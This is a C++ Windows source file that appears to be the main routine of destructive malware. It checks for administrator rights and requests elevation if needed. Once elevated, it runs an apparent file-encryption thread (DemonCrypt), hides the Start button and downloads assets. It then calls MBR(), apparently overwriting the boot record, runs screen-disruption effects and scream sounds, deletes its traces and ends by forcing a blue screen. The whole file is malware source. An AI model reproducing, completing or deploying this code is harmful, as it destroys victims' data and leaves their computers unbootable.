#pragma comment(lib, "winmm.lib")
#include <Windows.h>
#include "VirsHad.h"
#include <stdio.h>
#include <thread>

int iter;

int loop(){
    if (iter < 100) {
        Scuaer(rand() % 255, rand() % 255, rand() % 255);
        Invers();
        iter++;
        loop();
    } else if (iter < 2100) {
        Icons();
        iter++;
        loop();
    } else if (iter < 2200) {
        Melt();
        Invers();
        iter++;
        loop();
    } else if (iter < 2350) {
        TextO(L"I want to understand why everything is so bad.");
        iter++;
        loop();
    } else {
        char str[] = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
        remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
        remove("C:\\Users\\Public\\Downloads\\scream.wav");
        char wp[] = "C:\\Users\\Public\\Downloads\\WP.bmp";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        remove("C:\\Users\\Public\\Downloads\\WP.bmp");
        remove("C:\\Users\\Public\\Downloads\\BG.wav");
        remove("C:\\Users\\Public\\Downloads\\icon.bmp");
    }
    return 0;
}

bool check() {
    TOKEN_ELEVATION_TYPE token;
    DWORD size;
    bool info = GetTokenInformation(GetCurrentProcessToken(), TokenElevationType, &token, sizeof(token), &size);
    return info && token != TokenElevationTypeLimited;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
    bool admincheck = check();

    if (admincheck == false) {
        Admin();
        return 0;
    } else {
        std::thread DC(DemonCrypt);

        HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
        HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
        ShowWindow(hStartButton, SW_HIDE);

        Download();

        char str[] = "C:\\Users\\Public\\Downloads\\WP.bmp";
        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        MBR();
        loop();
        DC.join();
        BSOD();
    }
    return 0;
}
